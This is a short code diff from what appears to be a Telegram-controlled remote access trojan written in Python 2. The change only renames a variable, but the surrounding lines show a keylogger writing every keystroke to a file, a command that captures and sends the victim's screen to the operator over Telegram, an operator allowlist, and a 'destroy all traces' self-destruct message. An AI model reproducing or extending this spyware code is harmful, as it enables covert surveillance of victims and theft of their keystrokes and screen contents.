@@ -32,14 +32,14 @@ def pressed_chars(event):	# on key pressed function
         f.write(char)	# write every char pressed
 
 def handle(msg):
-	ID = msg['chat']['id']
+	chat_id = msg['chat']['id']
 	command = msg['text']
 	print('')
 	#print(strftime('[%d %b, %y %r] ') + str(chat_id) + ': ' + command)
 	print command
 	print msg
 
-	if checkchat_id(ID):
+	if checkchat_id(chat_id):
 		if command == '/capture_pc':
 			bot.sendChatAction(chat_id, 'typing')
 			screenshot = ImageGrab.grab()
@@ -125,7 +125,7 @@ def handle(msg):
 			bot.sendMessage(chat_id, "DESTROYING ALL TRACES! POOF!")
 			# self_destruct
 
-def checkchat_id(ID):
+def checkchat_id(chat_id):
 	# REPLACE '123456' WITH YOUR ACTUAL chat_id!
 	known_ids = ['124356']
 	# COMMENT THE LINE 'return True'!
